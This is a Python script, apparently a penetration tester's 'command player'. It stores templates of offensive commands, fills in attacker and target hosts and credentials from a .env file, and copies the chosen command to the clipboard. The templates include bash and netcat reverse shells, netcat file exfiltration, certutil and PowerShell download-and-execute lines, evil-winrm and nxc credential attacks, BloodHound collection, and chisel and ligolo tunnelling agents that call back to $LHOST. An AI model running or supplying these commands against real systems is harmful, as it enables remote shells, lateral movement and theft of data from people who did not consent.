#!/usr/bin/env python3

import argparse
import os
import re
from re import match
from subprocess import Popen, PIPE
from dotenv import load_dotenv
from pathlib import Path

PATH_TOOLS = Path.home() / "tools"

commands = {
    "curl"         : "curl -OL http://$LHOST/$FILE",
    "wget"         : "wget http://$LHOST/$FILE",
    "bash"         : "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
    "http"         : "http://$LHOST/$FILE",
    "nc-file"      : "nc -w 3 $LHOST $LPORT < $FILE",
    "nc-rev"       : "rm /tmp/f; mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1",
    "ps-wr"        : "Invoke-WebRequest http://$LHOST/$FILE -OutFile $FILE",
    # "ps-dl"        : "powershell \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
    # "ps-ex"        : "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/$FILE')\"",
    "certutil"     : "certutil -urlcache -split -f http://$LHOST/$FILE",
    "xfreerdp"     : "xfreerdp3 /dynamic-resolution /cert:ignore +clipboard /v:'$RHOST' /u:'$UN' /p:'$PW' /d:'$DOMAIN' /drive:share,. /drive:tools,/home/lorne/tools /auth-pkg-list:'!kerberos' &",
    "nxc-ldap"     : "nxc ldap $RHOST -u '$UN' -p '$PW'",
    "nxc-rdp"      : "nxc rdp $RHOST -u '$UN' -p '$PW'",
    "nxc-smb"      : "nxc smb $RHOST -u '$UN' -p '$PW'",
    "bloodhound"   : "bloodhound-ce-python -u '$UN' -p '$PW' -dc '$DC' -d '$DOMAIN' -ns '$NS' --collectionmethod ALL",
    "bloodyAD"     : "bloodyAD -d '$DOMAIN' -u '$UN' -p '$PW'",
    "evil-winrm"   : "evil-winrm -i '$RHOST' -u '$UN' -p '$PW'",
    "msfvenom"     : "msfvenom LHOST=$LHOST LPORT=$LPORT",
    "chisel-server": "chisel server -p 9000 --socks5 --reverse &",
    "chisel-linux" : "./chisel client $LHOST:9000 R:1080:socks &",
    "chisel-win"   : "start ./chisel 'client $LHOST:9000 R:1080:socks'",
    "ligolo"       : "./agent -ignore-cert -connect $LHOST:11601  &",
    "ligolo-win"   : "start ./agent.exe '-ignore-cert -connect $LHOST:11601'",
}

def replace(input, vars):
    output = input
    for key in vars.keys():
        output = output.replace(key, vars[key])
    return output


def get_command():
    print("Available commands:")
    for i, key in enumerate(commands.keys()):
        print(f"{i: >2}) {key : <13} : {commands[key]}")
    choice = input("\nChoose a command to play: ")
    try:
        cmd = list(commands.keys())[int(choice)]
    except:
        cmd = ""
    return cmd

def get_file():
    tools = PATH_TOOLS
    files = sorted([p.name for p in tools.iterdir()], key=str.lower)
    for i, file in enumerate(files):
        print(f"{i : >2}) {file}")
    choice = input("\nChoose a file to transfer: ")
    if choice == "":
        return ""
    return files[int(choice)]


def load_vars():
    load_dotenv("./.env")
    list = (
        "LHOST",
        "LPORT",
        "RHOST",
        "RPORT",
        "domain",
        "dc",
        "ns",
        "fqdn",
        "un",
        "pw",
    )
    vars = {}
    for var in list:
        vars[f"${var.upper()}"] = os.environ.get(var, "")
    if args.file != "":
        vars["$FILE"] = args.file
    return vars


def main(args):

    command = ""
    cmd = args.cmd
    vars = load_vars()
   
    # Variable overrides 
    if args.lhost:
        vars["$LHOST"] = args.lhost
    if args.lport:
        vars["$LPORT"] = args.lport
        vars["$LHOST"] += f":{args.lport}"
    if args.rhost:
        vars["$RHOST"] = args.rhost
    
    for key, value in commands.items():
        commands[key] = replace(value, vars)   

    if cmd == "":
        cmd = get_command()

    if cmd in commands:
        command = commands[cmd]
        if "$FILE" in command:
            if args.file == "":
                args.file = get_file()
            command = command.replace("$FILE", args.file)
        if args.proxychains:
            command = f"proxychains {command}"
        p1 = Popen(["xclip", "-selection", "clipboard", "-f"], stdin=PIPE)
        p1.communicate(input=(command.encode()))
    else:
        print("Command not found")


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Command player")
    parser.add_argument("-f", "--file", default="", dest="file", action="store", type=str, help="File name")
    parser.add_argument("-r", "--rhost", default="", dest="rhost", action="store", type=str, help="remote port")
    parser.add_argument("-l", "--lhost", default="", dest="lhost", action="store", type=str, help="local host")
    parser.add_argument("-lp", "--lport", default="", dest="lport", action="store", type=str, help="local port")
    parser.add_argument("-u", "--user", default="", dest="user", action="store", type=str, help="Username")
    parser.add_argument("-p", "--password", default="", dest="password", action="store", type=str, help="Password")
    parser.add_argument("-pc", "--proxychains", action="store_true", default=False, help="Use proxychains")
    parser.add_argument("cmd", default="", nargs="?", type=str, help="Choose a command to play")
    args = parser.parse_args()
    main(args)
